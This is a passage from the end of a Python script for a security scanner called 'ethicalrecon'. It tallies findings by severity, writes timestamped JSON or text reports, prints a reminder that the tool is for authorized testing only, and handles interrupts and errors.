        # Generate summary
        severity_counts = {}
        for vuln in scanner.results:
            severity = vuln['severity']
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        print(f"{Colors.CYAN}[SUMMARY]{Colors.RESET} Vulnerabilities by severity:")
        for severity, count in severity_counts.items():
            color = Colors.RED if severity == 'Critical' else Colors.YELLOW if severity == 'High' else Colors.BLUE
            print(f"  {color}{severity}{Colors.RESET}: {count}")
        
        # Generate reports in requested formats
        formats = args.format.split(',')
        for fmt in formats:
            fmt = fmt.strip().lower()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if fmt == 'json':
                output_file = output_dir / f"ethicalrecon_{timestamp}.json"
                scanner.generate_report(str(output_file), 'json')
            elif fmt == 'text':
                output_file = output_dir / f"ethicalrecon_{timestamp}.txt"
                scanner.generate_report(str(output_file), 'text')
        
        print(f"\n{Colors.GREEN}[COMPLETED]{Colors.RESET} Scan finished. Reports saved to {output_dir}")
        
    else:
        print(f"\n{Colors.YELLOW}[INFO]{Colors.RESET} No vulnerabilities found.")
        
        # Still generate a report with scan info
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = output_dir / f"ethicalrecon_{timestamp}.json"
        scanner.generate_report(str(output_file), 'json')
    
    # Legal reminder
    print(f"\n{Colors.PURPLE}[REMINDER]{Colors.RESET} This tool is for authorized security testing only.")
    print(f"{Colors.PURPLE}[REMINDER]{Colors.RESET} Ensure you have permission before scanning any targets.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INTERRUPTED]{Colors.RESET} Scan interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[FATAL ERROR]{Colors.RESET} {str(e)}")
        sys.exit(1)
